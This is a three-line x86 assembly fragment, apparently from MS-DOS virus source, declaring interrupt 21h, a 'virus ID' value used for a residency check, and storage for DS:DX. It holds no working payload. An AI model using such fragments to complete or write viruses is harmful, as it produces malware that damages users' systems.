nISRNumber EQU 21h
nVirusID EQU 4BF7h ;has to be 4Bxxh where the range are xx=03 to FF
_DX_DS dw 2 dup (?) ;DS:DX is stored here, first DX, then DS
